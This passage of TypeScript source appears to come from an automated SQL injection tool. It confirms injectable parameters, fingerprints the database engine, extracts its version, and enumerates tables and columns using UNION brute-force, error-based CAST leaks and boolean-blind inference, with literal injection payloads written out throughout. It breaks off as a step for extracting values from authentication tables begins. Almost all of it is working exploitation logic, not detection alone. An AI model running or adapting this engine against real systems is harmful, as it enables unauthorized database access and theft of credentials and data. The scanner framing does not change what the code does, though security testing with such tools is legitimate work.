                  confidenceScore: 95,
                  evidence: [`Canary reflection confirmed via ${cProbe.dbms} UNION syntax`],
                };
              }

              const ev: SqlScanEvidence = {
                id: `ev_union_${Date.now()}`,
                title: `UNION SQLi: Canary reflection at column ${cProbe.targetColumnIndex}`,
                timestamp: Date.now(),
                injectionType: 'UNION-based',
                parameterName: param.name,
                parameterLocation: param.location,
                payload: cProbe.payload,
                baselineStatus,
                baselineLength: baselineBody.length,
                baselineDurationMs: timingStats.median,
                testStatus: uRes.status,
                testLength: uRes.body.length,
                testDurationMs: uRes.durationMs,
                rawRequest: uRes.rawRequest,
                rawResponse: uRes.rawResponse,
                matchedPattern: cProbe.canaryMarker,
                reproductionCount: 1,
                analysisSummary: `Harmless canary marker "${cProbe.canaryMarker}" successfully reflected at column index ${cProbe.targetColumnIndex}`,
              };
              paramEvidenceList.push(ev);

              this.logExecution(param.name, 'UNION-Based SQLi', param.detectedContext || 'string', cProbe.payload, 'positive', uRes.durationMs, `Canary ${cProbe.canaryMarker} rendered at column ${cProbe.targetColumnIndex}`, uRes.rawRequest, uRes.rawResponse);
              this.updateCoverage('union_sqli', { status: 'vulnerable', testedCount: (this.coverageMap.get('union_sqli')?.testedCount || 0) + 1, positiveCount: 1 });

              this.log(
                'success',
                'union_testing',
                `UNION SQL Injection confirmed on "${param.name}": Canary [${cProbe.canaryMarker}] rendered at column ${confirmedRenderColumn}.`,
                undefined,
                cProbe.payload,
                param.name
              );
              break;
            } else {
              this.logExecution(param.name, 'UNION-Based SQLi', param.detectedContext || 'string', cProbe.payload, 'negative', uRes.durationMs, undefined, uRes.rawRequest, uRes.rawResponse);
            }
          }
        }
      }

      // If vulnerable, register Finding
      if (paramIsVulnerable && paramEvidenceList.length > 0) {
        const confBreakdown = ConfidenceEngine.calculateConfidence({
          hasConsistentSqlError: paramEvidenceList.some((e) => e.injectionType === 'Error-based'),
          hasBooleanDiff: paramEvidenceList.some((e) => e.injectionType === 'Boolean-based'),
          hasTimeDifferential: paramEvidenceList.some((e) => e.injectionType === 'Time-based'),
          hasUnionCanary: paramEvidenceList.some((e) => e.injectionType === 'UNION-based'),
          hasDbmsSpecificBehavior: this.dbmsFingerprint.dbms !== 'Unknown',
          hasRepeatedConfirmation: paramEvidenceList.length > 1,
        });

        const primaryType = paramEvidenceList[0].injectionType;
        const finding: SqlScanFinding = {
          id: `finding_${param.name}_${Date.now()}`,
          title: `SQL Injection (${primaryType}) in ${param.name}`,
          severity: 'Critical',
          confidence: confBreakdown.level,
          confidenceScore: confBreakdown.score,
          confidenceBreakdown: confBreakdown,
          injectionType: primaryType,
          parameterName: param.name,
          parameterLocation: param.location,
          url: parsed.url,
          httpMethod: parsed.method,
          dbms: this.dbmsFingerprint.dbms,
          dbmsVersion: this.dbmsFingerprint.version,
          detectionMethod: paramEvidenceList.map((e) => e.injectionType).join(' + '),
          evidence: paramEvidenceList,
          reproductionRequest: paramEvidenceList[0].rawRequest,
          reproductionResponse: paramEvidenceList[0].rawResponse,
          remediation: `Use strongly typed Parameterized Queries / Prepared Statements to strictly prevent user data from breaking out of SQL execution contexts. Never concatenate user input directly into SQL queries.`,
          cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
          owaspCategory: 'A03:2021 â€” Injection',
          timestamp: Date.now(),
        };

        this.findings.push(finding);
        this.onFinding(finding);

        if (this.safetyConfig.scanMode === 'quick') {
          this.log('info', 'testing', `Quick Mode: Injection verified on "${param.name}". Fast-forwarding directly to Database Schema Extraction.`);
          break;
        }
      }
    }

    // 6. Dynamic Version Extraction (Querying the real database)
    if (confirmedInjectableParam && confirmedColumnCount > 0 && !this.isAborted) {
      this.updateProgress('version_detection', 'Executing Live DBMS Version Extraction Query', 78);
      const adapter = DATABASE_ADAPTERS[this.dbmsFingerprint.dbms] || DATABASE_ADAPTERS['PostgreSQL'] || DATABASE_ADAPTERS['Oracle'];
      const versionQuery = adapter.getVersionExtractionQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount);

      const vRes = await this.executeProbe(parsed, confirmedInjectableParam, versionQuery, true);
      const delimitedVersions = MetadataExtractor.extractDelimitedTokens(vRes.body, 'VER')
        .filter((v) => MetadataExtractor.isValidVersionString(v));

      let finalVersion = delimitedVersions[0] || MetadataExtractor.extractVersionFromText(vRes.body, this.dbmsFingerprint.dbms);

      if (!finalVersion) {
        // Try extracting version across all known DBMS regexes
        for (const testDbms of ['PostgreSQL', 'MySQL', 'Oracle', 'Microsoft SQL Server', 'SQLite'] as DbmsType[]) {
          const v = MetadataExtractor.extractVersionFromText(vRes.body, testDbms);
          if (v) {
            finalVersion = v;
            if (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL') {
              this.dbmsFingerprint.dbms = testDbms;
            }
            break;
          }
        }
      }

      if (finalVersion && MetadataExtractor.isValidVersionString(finalVersion)) {
        this.dbmsFingerprint.version = finalVersion;
        this.dbmsFingerprint.evidence.push(`Version string returned by database: "${finalVersion}"`);
        this.updateCoverage('version_detection', { status: 'passed', testedCount: 1, positiveCount: 1, reason: finalVersion });
        this.log('success', 'version_detection', `Verified Database Version: "${finalVersion}"`);
      } else {
        this.dbmsFingerprint.version = undefined;
        this.updateCoverage('version_detection', { status: 'not_applicable', testedCount: 1, positiveCount: 0, reason: 'Version query returned no valid version token (not disclosed)' });
      }
    }

    // 7. Adaptive Intelligence Schema & Table Enumeration
    if (confirmedInjectableParam && !this.isAborted) {
      this.updateProgress('schema_analysis', 'Initializing Adaptive Intelligence Engine', 82);

      // ─── Step 7a: Initialize Adaptive Engine ──────────────────────
      const adaptiveEngine = new AdaptivePayloadEngine(
        (this.dbmsFingerprint.dbms !== 'Unknown' && this.dbmsFingerprint.dbms !== 'Generic SQL')
          ? this.dbmsFingerprint.dbms as any
          : 'PostgreSQL'
      );

      // ─── Step 7b: Quote Style Detection ──────────────────────────
      this.log('info', 'schema_analysis', 'Detecting injection quote style (balanced vs commented)...');
      const qsProbes = adaptiveEngine.getQuoteStyleProbes();
      const balancedRes = await this.executeProbe(parsed, confirmedInjectableParam, qsProbes.balanced, true);
      const commentedRes = await this.executeProbe(parsed, confirmedInjectableParam, qsProbes.commented, true);

      // Check which style returns a TRUE-like response (matches baseline behavior)
      const balancedMatch = Math.abs(balancedRes.body.length - baselineBody.length) < 80 && balancedRes.status === baselineStatus;
      const commentedMatch = Math.abs(commentedRes.body.length - baselineBody.length) < 80 && commentedRes.status === baselineStatus;

      if (commentedMatch && !balancedMatch) {
        adaptiveEngine.setQuoteStyle('commented');
        this.log('info', 'schema_analysis', 'Quote style confirmed: COMMENTED (trailing -- required)');
      } else {
        adaptiveEngine.setQuoteStyle('balanced');
        this.log('info', 'schema_analysis', 'Quote style confirmed: BALANCED (string context closure)');
      }

      // ─── Step 7c: Calibration Phase ──────────────────────────────
      this.updateProgress('schema_analysis', 'Calibrating response classifier from verified baselines', 83);
      const calibrationPairs = adaptiveEngine.getCalibrationProbes();
      const trueBodies: { body: string; status: number }[] = [];
      const falseBodies: { body: string; status: number }[] = [];

      for (const pair of calibrationPairs) {
        if (this.isAborted) break;
        const tRes = await this.executeProbe(parsed, confirmedInjectableParam, pair.truePayload, true);
        const fRes = await this.executeProbe(parsed, confirmedInjectableParam, pair.falsePayload, true);
        trueBodies.push({ body: tRes.body, status: tRes.status });
        falseBodies.push({ body: fRes.body, status: fRes.status });
      }

      const calResult = adaptiveEngine.calibrate(trueBodies, falseBodies);
      this.log('success', 'schema_analysis',
        `Adaptive classifier calibrated: strategy="${calResult.strategy}", marker="${calResult.marker || 'N/A'}", confidence=${calResult.confidence}%`
      );

      // Also update confirmedTrueMarker if we found a better one
      if (calResult.marker && (!confirmedTrueMarker || confirmedTrueMarker.length === 0)) {
        confirmedTrueMarker = calResult.marker;
      }

      // ─── Step 7d: DBMS Fingerprinting ──────────────────────────────
      if ((this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL') && !this.isAborted) {
        this.updateProgress('schema_analysis', 'Fingerprinting database engine via dialect probes', 84);

        // PostgreSQL-specific: version() function exists
        const pgProbeTrue = await this.executeProbe(parsed, confirmedInjectableParam,
          calResult.quoteStyle === 'commented'
            ? "' AND (SELECT version()) IS NOT NULL--"
            : "' AND (SELECT version()) IS NOT NULL AND '1'='1", true);
        const pgProbeFalse = await this.executeProbe(parsed, confirmedInjectableParam,
          calResult.quoteStyle === 'commented'
            ? "' AND (SELECT version()) IS NULL--"
            : "' AND (SELECT version()) IS NULL AND '1'='1", true);

        if (adaptiveEngine.classifyResponse(pgProbeTrue.body, pgProbeTrue.status) === 'TRUE' &&
            adaptiveEngine.classifyResponse(pgProbeFalse.body, pgProbeFalse.status) === 'FALSE') {
          this.dbmsFingerprint = { dbms: 'PostgreSQL', confidence: 'High', confidenceScore: 95, evidence: ['PostgreSQL version() function confirmed via boolean differential'] };
          adaptiveEngine.setDbms('PostgreSQL');
          this.log('success', 'schema_analysis', 'Fingerprinted DBMS as: PostgreSQL');
        } else {
          // Try Oracle DUAL
          const oraTrue = await this.executeProbe(parsed, confirmedInjectableParam,
            calResult.quoteStyle === 'commented'
              ? "' AND (SELECT 1 FROM DUAL)=1--"
              : "' AND (SELECT 1 FROM DUAL)=1 AND '1'='1", true);
          if (adaptiveEngine.classifyResponse(oraTrue.body, oraTrue.status) === 'TRUE') {
            this.dbmsFingerprint = { dbms: 'Oracle', confidence: 'High', confidenceScore: 95, evidence: ['Oracle DUAL table confirmed'] };
            adaptiveEngine.setDbms('Oracle');
            this.log('success', 'schema_analysis', 'Fingerprinted DBMS as: Oracle');
          } else {
            // Try MySQL @@version
            const myTrue = await this.executeProbe(parsed, confirmedInjectableParam,
              calResult.quoteStyle === 'commented'
                ? "' AND @@version=@@version#"
                : "' AND @@version=@@version AND '1'='1", true);
            if (adaptiveEngine.classifyResponse(myTrue.body, myTrue.status) === 'TRUE') {
              this.dbmsFingerprint = { dbms: 'MySQL', confidence: 'High', confidenceScore: 95, evidence: ['MySQL @@version confirmed'] };
              adaptiveEngine.setDbms('MySQL');
              this.log('success', 'schema_analysis', 'Fingerprinted DBMS as: MySQL');
            } else {
              this.dbmsFingerprint = { ...this.dbmsFingerprint, dbms: 'PostgreSQL', confidence: 'Medium', confidenceScore: 60, evidence: ['Defaulting to PostgreSQL dialect'] };
              this.log('info', 'schema_analysis', 'DBMS could not be fingerprinted precisely. Defaulting to PostgreSQL dialect.');
            }
          }
        }
      }

      // ─── Step 7e: Intelligent Table Discovery ──────────────────────
      this.updateProgress('schema_analysis', 'Discovering database tables', 85);
      let appDiscoveredNames: string[] = [];
      let sysDiscoveredNames: string[] = [];

      // PATH A: UNION extraction with confirmed column count
      if (confirmedColumnCount > 0 && !this.isAborted) {
        this.log('info', 'schema_analysis', `Using UNION extraction with ${confirmedColumnCount} columns (render column: ${confirmedRenderColumn})`);

        // A1: Delimited extraction (information_schema / user_tables)
        const tableQuery = MetadataExtractor.getTableEnumerationQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, this.dbmsFingerprint.dbms);
        const tRes = await this.executeProbe(parsed, confirmedInjectableParam, tableQuery, true);
        let allDiscovered = MetadataExtractor.extractDelimitedTokens(tRes.body, 'TBL').filter((n) => MetadataExtractor.isValidIdentifier(n));

        // A2: Clean extraction without delimiters (fallback)
        if (allDiscovered.length === 0 && !this.isAborted) {
          const cleanQuery = MetadataExtractor.getCleanTableEnumerationQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, this.dbmsFingerprint.dbms);
          const cRes = await this.executeProbe(parsed, confirmedInjectableParam, cleanQuery, true);
          allDiscovered = MetadataExtractor.extractHtmlOrTextTokens(cRes.body, baselineBody);
        }

        // A3: all_tables for Oracle / broader scope
        if (allDiscovered.length === 0 && !this.isAborted) {
          const allTablesQuery = MetadataExtractor.getAllTablesEnumerationQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, this.dbmsFingerprint.dbms);
          const atRes = await this.executeProbe(parsed, confirmedInjectableParam, allTablesQuery, true);
          allDiscovered = MetadataExtractor.extractDelimitedTokens(atRes.body, 'TBL').filter((n) => MetadataExtractor.isValidIdentifier(n));
          if (allDiscovered.length === 0) {
            allDiscovered = MetadataExtractor.extractHtmlOrTextTokens(atRes.body, baselineBody);
          }
        }

        for (const n of allDiscovered) {
          if (MetadataExtractor.classifyTable(n, undefined, this.dbmsFingerprint.dbms) === 'application') {
            if (!appDiscoveredNames.includes(n)) appDiscoveredNames.push(n);
          } else {
            if (!sysDiscoveredNames.includes(n)) sysDiscoveredNames.push(n);
          }
        }

        if (allDiscovered.length > 0) {
          this.log('success', 'schema_analysis', `UNION extraction found ${allDiscovered.length} table(s): ${allDiscovered.slice(0, 10).join(', ')}`);
        } else {
          // ORDER BY gave wrong column count — reset and fall through to bruteforce
          this.log('warn', 'schema_analysis', `UNION extraction with ${confirmedColumnCount} columns found 0 tables. ORDER BY may have given wrong count. Resetting for bruteforce...`);
          confirmedColumnCount = 0;
          confirmedRenderColumn = 0;
        }
      }

      // PATH B: UNION bruteforce — try each column count 1-10 with ACTUAL table extraction queries
      // This runs when: ORDER BY failed, ORDER BY gave wrong count, or UNION path A found nothing
      if (appDiscoveredNames.length === 0 && confirmedInjectableParam && !this.isAborted) {
        this.log('info', 'schema_analysis', 'Attempting UNION bruteforce with column counts 1-10...');
        const isNum = /^\d+$/.test(confirmedInjectableParam.originalValue.trim());
        const prefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";

        // Build direct table extraction queries for each column count
        for (let numCols = 1; numCols <= 10; numCols++) {
          if (this.isAborted || appDiscoveredNames.length > 0) break;

          // Build NULL-padded parts, placing table_name expression at each position
          for (let renderPos = 1; renderPos <= numCols; renderPos++) {
            if (this.isAborted || appDiscoveredNames.length > 0) break;

            const allFromClauses: Array<{ sql: string; dbms: DbmsType; colExpr: string }> = [
              { sql: 'FROM all_tables--', dbms: 'Oracle', colExpr: MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'Oracle') },
              { sql: "FROM information_schema.tables WHERE table_schema='public'-- ", dbms: 'PostgreSQL', colExpr: MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'PostgreSQL') },
              { sql: 'FROM information_schema.tables WHERE table_schema=DATABASE()-- ', dbms: 'MySQL', colExpr: MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'MySQL') },
              { sql: 'FROM information_schema.tables-- ', dbms: 'Generic SQL', colExpr: MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'PostgreSQL') },
              { sql: 'FROM sys.tables-- ', dbms: 'Microsoft SQL Server', colExpr: MetadataExtractor.wrapWithDelimiters('name', 'TBL', 'Microsoft SQL Server') },
              { sql: "FROM sqlite_master WHERE type='table'-- ", dbms: 'SQLite', colExpr: MetadataExtractor.wrapWithDelimiters('name', 'TBL', 'SQLite') },
            ];

            // Put detected DBMS first for efficiency
            const detectedDbms = this.dbmsFingerprint.dbms;
            const fromClauses = detectedDbms && detectedDbms !== 'Unknown' && detectedDbms !== 'Generic SQL'
              ? [...allFromClauses.filter(fc => fc.dbms === detectedDbms), ...allFromClauses.filter(fc => fc.dbms !== detectedDbms)]
              : allFromClauses;

            for (const fc of fromClauses) {
              if (this.isAborted || appDiscoveredNames.length > 0) break;

              // Use the correct delimited column name for each DBMS
              const dbmsParts = Array(numCols).fill('NULL');
              dbmsParts[renderPos - 1] = fc.colExpr;
              const brutePayload = `${prefix}${dbmsParts.join(',')} ${fc.sql}`;
              const bRes = await this.executeProbe(parsed, confirmedInjectableParam, brutePayload, true);

              // Check if response is valid (status 200 and reasonable body length)
              if (bRes.status === 200 || bRes.status === baselineStatus) {
                // First try strictly with delimiters to avoid false positives
                let extracted = MetadataExtractor.extractDelimitedTokens(bRes.body, 'TBL').filter(n => MetadataExtractor.isValidIdentifier(n));

                // Only if delimited fails, and we DO NOT have a confirmed boolean blind vulnerability, fallback to heuristic HTML extraction
                if (extracted.length === 0 && !confirmedTrueMarker) {
                  extracted = MetadataExtractor.extractHtmlOrTextTokens(bRes.body, baselineBody);
                }

                if (extracted.length > 0) {
                  confirmedColumnCount = numCols;
                  confirmedRenderColumn = renderPos;
                  if (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL') {
                    this.dbmsFingerprint = { dbms: fc.dbms, confidence: 'High', confidenceScore: 90, evidence: [`UNION bruteforce succeeded with ${fc.dbms} syntax`] };
                  }

                  for (const n of extracted) {
                    if (MetadataExtractor.classifyTable(n, undefined, this.dbmsFingerprint.dbms) === 'application') {
                      if (!appDiscoveredNames.includes(n)) appDiscoveredNames.push(n);
                    } else {
                      if (!sysDiscoveredNames.includes(n)) sysDiscoveredNames.push(n);
                    }
                  }

                  this.log('success', 'schema_analysis', `✓ UNION bruteforce: ${numCols} columns, render position ${renderPos}, ${fc.dbms} — found ${extracted.length} table(s)`);
                  break;
                }
              }
            }
          }
        }
      }

      // PATH C: Error-Based CAST / Type Conversion Table Discovery (e.g. PostgreSQL, MSSQL, MySQL)
      if (appDiscoveredNames.length === 0 && confirmedInjectableParam && !this.isAborted) {
        this.log('info', 'schema_analysis', 'Attempting Error-Based CAST / Conversion schema discovery...');
        let errorDbmsFound = false;

        for (let offset = 0; offset < 20; offset++) {
          if (this.isAborted) break;
          const errorQueries = MetadataExtractor.getErrorBasedTableQueries(
            confirmedInjectableParam,
            offset,
            this.dbmsFingerprint.dbms,
            true
          );

          let foundAtOffset = false;
          for (const eq of errorQueries) {
            if (this.isAborted || foundAtOffset) break;
            // Test both replacement mode (append=false) and append mode to avoid cookie length truncation
            let errRes = await this.executeProbe(parsed, confirmedInjectableParam, eq, false);
            let leakedTableName = MetadataExtractor.extractErrorBasedData(errRes.body);

            if (!leakedTableName) {
              errRes = await this.executeProbe(parsed, confirmedInjectableParam, eq, true);
              leakedTableName = MetadataExtractor.extractErrorBasedData(errRes.body);
            }

            if (leakedTableName && MetadataExtractor.isValidIdentifier(leakedTableName)) {
              foundAtOffset = true;
              errorDbmsFound = true;
              const classification = MetadataExtractor.classifyTable(leakedTableName, undefined, this.dbmsFingerprint.dbms);

              if (classification === 'application') {
                if (!appDiscoveredNames.includes(leakedTableName)) {
                  appDiscoveredNames.push(leakedTableName);
                  this.log('success', 'schema_analysis', `✓ Error-based CAST table discovered: "${leakedTableName}" (offset ${offset})`);
                }
              } else {
                if (!sysDiscoveredNames.includes(leakedTableName)) {
                  sysDiscoveredNames.push(leakedTableName);
                }
              }

              if (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL') {
                const detectedType: DbmsType = eq.includes('CAST(') ? 'PostgreSQL' : eq.includes('CONVERT(') ? 'Microsoft SQL Server' : 'MySQL';
                this.dbmsFingerprint = {
                  dbms: detectedType,
                  confidence: 'Confirmed',
                  confidenceScore: 100,
                  evidence: [`Disclosed via database conversion error: "${leakedTableName}"`],
                };
              }

              this.emitProgressiveCatalog(appDiscoveredNames, sysDiscoveredNames, confirmedInjectableParam, confirmedColumnCount, confirmedRenderColumn);
            }
          }

          // If offset 0 returned nothing, error-based casting isn't active on this endpoint
          if (offset === 0 && !errorDbmsFound) {
            break;
          }
          if (!foundAtOffset && offset > 0) {
            break; // Reached end of tables
          }
        }
      }

      // PATH D: Boolean Blind Adaptive Table Discovery (fallback when UNION & Error-based don't work)
      if (appDiscoveredNames.length === 0 && !this.isAborted) {
        this.log('info', 'schema_analysis', 'Using adaptive boolean inference for table discovery...');

        const highPriority = AdaptivePayloadEngine.getHighPriorityTables();
        const medPriority = AdaptivePayloadEngine.getMediumPriorityTables();
        const allCandidates = [...highPriority, ...medPriority];

        for (const tbl of allCandidates) {
          if (this.isAborted) break;
          const probes = adaptiveEngine.generateTableProbe(tbl);
          const tRes = await this.executeProbe(parsed, confirmedInjectableParam, probes.truePayload, true);
          const classification = adaptiveEngine.classifyResponse(tRes.body, tRes.status);

          if (classification === 'TRUE') {
            appDiscoveredNames.push(tbl);
            this.log('success', 'schema_analysis', `✓ Table confirmed: "${tbl}" (adaptive ${calResult.strategy} classification)`);

            // Progressive catalog emission — update UI immediately
            this.emitProgressiveCatalog(appDiscoveredNames, sysDiscoveredNames, confirmedInjectableParam, confirmedColumnCount, confirmedRenderColumn);
          }
        }
      }

      this.log('info', 'schema_analysis', `Discovered ${appDiscoveredNames.length} application table(s) and ${sysDiscoveredNames.length} system table(s).`);

      // â”€â”€â”€ Build table objects â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      const appTables: DiscoveredTable[] = appDiscoveredNames.map((tName) => {
        const sensitivity = MetadataExtractor.isSensitiveName(tName);
        return {
          id: `tbl_${tName}`,
          name: tName,
          classification: 'application' as const,
          columns: [],
          isSensitive: sensitivity.isSensitive,
          sensitivityReason: sensitivity.reason,
          discoveredAt: Date.now(),
          status: 'discovered' as const,
        };
      });

      const sysTables: DiscoveredTable[] = sysDiscoveredNames.map((tName) => ({
        id: `tbl_${tName}`,
        name: tName,
        classification: 'system' as const,
        columns: [],
        isSensitive: false,
        discoveredAt: Date.now(),
        status: 'discovered' as const,
      }));

      // Emit initial catalog
      this.catalog = {
        dbms: this.dbmsFingerprint.dbms,
        version: this.dbmsFingerprint.version,
        versionEvidence: this.dbmsFingerprint.evidence.join('; '),
        columnCount: confirmedColumnCount,
        renderColumn: confirmedRenderColumn,
        injectableParamName: confirmedInjectableParam?.name,
        schemas: [{ name: 'CURRENT_SCHEMA', classification: 'application', tables: appTables, views: [], isExpanded: true, discoveredAt: Date.now() }],
        applicationTables: appTables,
        systemTables: sysTables,
        discoveredAt: Date.now(),
      };
      if (this.onCatalog) this.onCatalog(this.catalog);

      // â”€â”€â”€ Step 8: Adaptive Column Enumeration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      const tablesToEnumerate = appTables.slice(0, 8);
      for (let idx = 0; idx < tablesToEnumerate.length; idx++) {
        const t = tablesToEnumerate[idx];
        if (this.isAborted) break;
        this.updateProgress('column_enumeration', `Enumerating columns: ${t.name}`, 88 + Math.round((idx / (tablesToEnumerate.length || 1)) * 6));

        if (confirmedColumnCount > 0) {
          // UNION-based column extraction
          const colQuery = MetadataExtractor.getColumnEnumerationQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, t.name, this.dbmsFingerprint.dbms);
          if (colQuery) {
            const colRes = await this.executeProbe(parsed, confirmedInjectableParam, colQuery, true);
            let colTokens = MetadataExtractor.extractDelimitedTokens(colRes.body, 'COL');
            let cols = MetadataExtractor.parseColumnTokens(colTokens);
            if (cols.length === 0) {
              const cleanColQuery = MetadataExtractor.getCleanColumnEnumerationQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, t.name, this.dbmsFingerprint.dbms);
              const cColRes = await this.executeProbe(parsed, confirmedInjectableParam, cleanColQuery, true);
              const rawCols = MetadataExtractor.extractHtmlOrTextTokens(cColRes.body, baselineBody);
              cols = rawCols.map((cName) => ({
                name: cName, dataType: 'VARCHAR', isNullable: true,
                isPrimaryKey: cName.toLowerCase() === 'id', isForeignKey: false, isIndexed: false,
                isSensitive: MetadataExtractor.isSensitiveName(cName).isSensitive,
                sensitivityReason: MetadataExtractor.isSensitiveName(cName).reason,
                confidence: 'Confirmed' as const, evidence: `Discovered via UNION extraction`, discoveredAt: Date.now(),
              }));
            }

            // Bruteforce column extraction if above failed
            if (cols.length === 0 && !this.isAborted) {
              const isNum = /^\d+$/.test(confirmedInjectableParam.originalValue.trim());
              const cPrefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";

              // Build column extraction queries for all DBMS types
              const cleanName = t.name.replace(/'/g, '');
              const colQueries: { colExpr: string; from: string }[] = [];
              const dbms = this.dbmsFingerprint.dbms;

              if (dbms === 'Oracle') {
                colQueries.push({ colExpr: 'column_name', from: `FROM all_tab_columns WHERE table_name='${cleanName.toUpperCase()}'--` });
              } else if (dbms === 'Microsoft SQL Server') {
                colQueries.push({ colExpr: 'name', from: `FROM sys.columns WHERE object_id=OBJECT_ID('${cleanName}')--` });
                colQueries.push({ colExpr: 'COLUMN_NAME', from: `FROM information_schema.columns WHERE table_name='${cleanName}'-- ` });
              } else if (dbms === 'SQLite') {
                // SQLite: extract CREATE TABLE sql and parse column names
                colQueries.push({ colExpr: 'sql', from: `FROM sqlite_master WHERE name='${cleanName}'-- ` });
              } else {
                // PostgreSQL, MySQL, Generic
                colQueries.push({ colExpr: 'column_name', from: `FROM information_schema.columns WHERE table_name='${cleanName}'-- ` });
              }
              // Always try generic information_schema as fallback
              if (dbms !== 'Generic SQL' && dbms !== 'PostgreSQL' && dbms !== 'MySQL') {
                colQueries.push({ colExpr: 'column_name', from: `FROM information_schema.columns WHERE table_name='${cleanName}'-- ` });
              }

              for (const cq of colQueries) {
                if (cols.length > 0 || this.isAborted) break;
                const cParts = Array(confirmedColumnCount).fill('NULL');
                cParts[confirmedRenderColumn - 1] = cq.colExpr;
                const bruteColPayload = `${cPrefix}${cParts.join(',')} ${cq.from}`;
                const bcRes = await this.executeProbe(parsed, confirmedInjectableParam, bruteColPayload, true);
                if (bcRes.status === 200 || bcRes.status === baselineStatus) {
                  const rawCols = MetadataExtractor.extractHtmlOrTextTokens(bcRes.body, baselineBody);
                  if (rawCols.length > 0) {
                    cols = rawCols.map((cName) => ({
                      name: cName, dataType: 'VARCHAR', isNullable: true,
                      isPrimaryKey: cName.toLowerCase() === 'id', isForeignKey: false, isIndexed: false,
                      isSensitive: MetadataExtractor.isSensitiveName(cName).isSensitive,
                      sensitivityReason: MetadataExtractor.isSensitiveName(cName).reason,
                      confidence: 'Confirmed' as const, evidence: `Discovered via UNION bruteforce`, discoveredAt: Date.now(),
                    }));
                    this.log('success', 'column_enumeration', `✓ UNION bruteforce columns for "${t.name}": ${rawCols.join(', ')}`);
                  }
                }
              }
            }

            t.columns = cols;
            t.status = cols.length > 0 ? 'columns_ready' : 'discovered';
            if (cols.length > 0) {
              this.log('success', 'column_enumeration', `Table "${t.name}": ${cols.length} column(s) found (${cols.map(c => c.name).join(', ')})`);
            }
          }
        }

        // Error-based column extraction fallback when UNION didn't find columns
        if (t.columns.length === 0 && confirmedInjectableParam && !this.isAborted) {
          const cols: ColumnMetadata[] = [];
          for (let cOff = 0; cOff < 15; cOff++) {
            if (this.isAborted) break;
            const colErrQueries = MetadataExtractor.getErrorBasedColumnQueries(
              confirmedInjectableParam,
              t.name,
              cOff,
              this.dbmsFingerprint.dbms,
              true
            );
            let foundColAtOffset = false;
            for (const ceq of colErrQueries) {
              if (this.isAborted || foundColAtOffset) break;
              let ceRes = await this.executeProbe(parsed, confirmedInjectableParam, ceq, false);
              let leakedCol = MetadataExtractor.extractErrorBasedData(ceRes.body);
              if (!leakedCol) {
                ceRes = await this.executeProbe(parsed, confirmedInjectableParam, ceq, true);
                leakedCol = MetadataExtractor.extractErrorBasedData(ceRes.body);
              }

              if (leakedCol && MetadataExtractor.isValidIdentifier(leakedCol)) {
                foundColAtOffset = true;
                if (!cols.some(c => c.name.toLowerCase() === leakedCol.toLowerCase())) {
                  cols.push({
                    name: leakedCol, dataType: 'VARCHAR', isNullable: true,
                    isPrimaryKey: leakedCol.toLowerCase() === 'id' || leakedCol.toLowerCase().endsWith('_id'),
                    isForeignKey: false, isIndexed: false,
                    isSensitive: MetadataExtractor.isSensitiveName(leakedCol).isSensitive,
                    sensitivityReason: MetadataExtractor.isSensitiveName(leakedCol).reason,
                    confidence: 'Confirmed', evidence: `Discovered via Error-Based CAST (offset ${cOff})`, discoveredAt: Date.now(),
                  });
                  this.log('success', 'column_enumeration', `✓ Error-based CAST column for "${t.name}": ${leakedCol}`);
                }
              }
            }
            if (cOff === 0 && cols.length === 0) break;
            if (!foundColAtOffset && cOff > 0) break;
          }

          if (cols.length > 0) {
            t.columns = cols;
            t.status = 'columns_ready';
            this.log('success', 'column_enumeration', `Table "${t.name}": ${cols.length} column(s) discovered via error casting (${cols.map(c => c.name).join(', ')})`);
          }
        }

        // Adaptive Boolean Column Inference Fallback
        if (t.columns.length === 0 && !this.isAborted) {
          const candidateCols = adaptiveEngine.getColumnsForTable(t.name);
          const cols: ColumnMetadata[] = [];

          for (const cName of candidateCols) {
            if (this.isAborted) break;
            const colProbes = adaptiveEngine.generateColumnProbe(t.name, cName);
            const cRes = await this.executeProbe(parsed, confirmedInjectableParam, colProbes.truePayload, true);
            const colClass = adaptiveEngine.classifyResponse(cRes.body, cRes.status);

            if (colClass === 'TRUE') {
              cols.push({
                name: cName, dataType: 'VARCHAR', isNullable: true,
                isPrimaryKey: cName === 'id' || cName.endsWith('_id'),
                isForeignKey: false, isIndexed: cName === 'id',
                isSensitive: MetadataExtractor.isSensitiveName(cName).isSensitive,
                sensitivityReason: MetadataExtractor.isSensitiveName(cName).reason,
                confidence: 'Confirmed',
                evidence: `Adaptive boolean inference (${calResult.strategy})`,
                discoveredAt: Date.now(),
              });
            }
          }
          t.columns = cols;
          t.status = cols.length > 0 ? 'columns_ready' : 'discovered';
          if (cols.length > 0) {
            this.log('info', 'column_enumeration', `Table "${t.name}": ${cols.length} column(s) confirmed (${cols.map(c => c.name).join(', ')})`);
          }
        }

        // Emit catalog update after columns discovered
        if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });

        // ─── Step 8b: Entity & Value Extraction for Auth Tables ──────
        const tNameLower = t.name.toLowerCase();
